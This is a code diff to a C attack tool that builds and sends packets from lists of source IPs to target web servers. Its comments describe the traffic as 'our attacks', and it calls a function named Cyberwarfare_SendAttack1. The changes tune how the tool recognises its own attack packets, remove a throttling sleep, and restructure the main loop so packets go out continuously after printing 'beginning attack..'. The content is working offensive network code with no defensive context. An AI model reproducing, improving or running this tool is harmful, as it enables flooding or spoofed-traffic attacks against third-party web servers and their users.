@@ -117,11 +117,11 @@ int packet_filter(uint32_t seq, uint32_t ip, unsigned short port, uint32_t ts, u
     xyz.a.e = ((xyz.a.c + xyz.a.d) & 0x000000ff);
 
     if (gen)
-        ts += 1;
+        ts += 2;
     else
         ts -= 3;
 
-    for (i =0; i < 5; i++) {
+    for (i =0; i < 10; i++) {
         xyz.a.a = ((ts + i) / 2) & 0x0000000f;
         xyz.a.b = ((ts + i) % 2) & 0x0000000f;
 
@@ -133,7 +133,7 @@ int packet_filter(uint32_t seq, uint32_t ip, unsigned short port, uint32_t ts, u
 
         if (xyz.b == seq) return 1;
 
-        return 1;
+        //return 1;
     }
 
     return 0;
@@ -146,9 +146,7 @@ int packet_filter(uint32_t seq, uint32_t ip, unsigned short port, uint32_t ts, u
 int FilterIsOurPacket(PacketBuildInstructions *iptr) {
     Oracle xyz;
     int i = 0;
-    // later usse time(0) once for thousands/millions of packets (depending on the network setup)
-    int ts = time(0);
-
+    
     // first check to weed out bad is high source port
     if (iptr->destination_port < 60000) return 0;
 
@@ -157,7 +155,7 @@ int FilterIsOurPacket(PacketBuildInstructions *iptr) {
 
     // now we use the addresses to create a small magic sequence like a checksum.. and itll
     // tell us if the packet is infact our attacks
-    if (packet_filter(iptr->ack, iptr->destination_ip, iptr->destination_port, ts, NULL)) return 1;
+    if (packet_filter(iptr->ack, iptr->destination_ip, iptr->destination_port, iptr->ts, NULL)) return 1;
 
     return 0;
 }
@@ -454,8 +452,7 @@ int file_to_iplist(AS_context *ctx, char *filename, char *country) {
 
 // this sends the initial syn packets to the web server fromm each IP...
 // it does not handle logic of what side of passive tap, or whatever.. it expects  all that to be worked out ahead of time
-void attack_thread(void *arg) {
-    AS_context *ctx = (AS_context *)arg;
+void start_attack(AS_context *ctx) {
     char *tags[] = { "A1", "00", NULL };
     int web_i = 0, req_i = 0, start = 0, count = 0;
     IPAddresses *webservers = IPAddressesPtr(ctx, tags[0]);
@@ -463,17 +460,24 @@ void attack_thread(void *arg) {
     int ts = 0;
     OutgoingPacketQueue *optr = NULL;
     int fast = 0;
+    int skip = 0;
 
     while (1) {
         ts = time(0);
-        for (web_i = 0; web_i < webservers->v4_count; web_i++) {
-            for (req_i = 0; req_i < requesters->v4_count; req_i++) {
-                Cyberwarfare_SendAttack1(ctx, requesters->v4_addresses[req_i], webservers->v4_addresses[web_i], ts, &optr);
-                if (fast) {
-                    OutgoingQueueLink(ctx, optr);
-                    optr = NULL;
+        if (!skip) {
+            for (web_i = 0; web_i < webservers->v4_count; web_i++) {
+                for (req_i = 0; req_i < requesters->v4_count; req_i++) {
+                    Cyberwarfare_SendAttack1(ctx, requesters->v4_addresses[req_i], webservers->v4_addresses[web_i], ts, &optr);
+                    if (fast) {
+                        OutgoingQueueLink(ctx, optr);
+                        AS_perform(ctx);
+                        optr = NULL;
+                    }
                 }
             }
+        } else {
+            skip--;
+            printf("skip %d\n",skip);
         }
 
         // push packets as quickly as possible if it takes more  than 1 second to send them all... otherwise our magic SEQ falls out of its time slice
@@ -482,15 +486,19 @@ void attack_thread(void *arg) {
         // push all packets together
         if (optr) {
             OutgoingQueueLink(ctx, optr);
-            optr = NULL;   
+            optr = NULL;
         }
 
+        AS_perform(ctx);        
+
         // this has to be adjusted.. a better system to limit needs to be in place.. not yet
-        if (count++ > 5000) sleep(5);
+        if (!(count++ % 500)) {
+            //skip = 5;
+        }
         //sleep(10);
     }
 
-    pthread_exit(0);
+    //pthread_exit(0);
 }
 
 int main(int argc, char *argv[]) {
@@ -518,19 +526,16 @@ int main(int argc, char *argv[]) {
         exit(-1);
     }
 
+/*
     // now its time to begin the attack.. 
     if (pthread_create(&attack_thread_handle, NULL, attack_thread, (void *)ctx) != 0) {
         fprintf(stderr, "cannot start threads\n");
         exit(-1);
     }
-
+*/
     printf("beginning attack..\n");
 
-    // let this execute... it loops the backend subsystems which receive, and send packets
-    while (1) {
-        AS_perform(ctx);
-        usleep(5000);
-    }
+    start_attack(ctx);
 
     exit(0);
 }
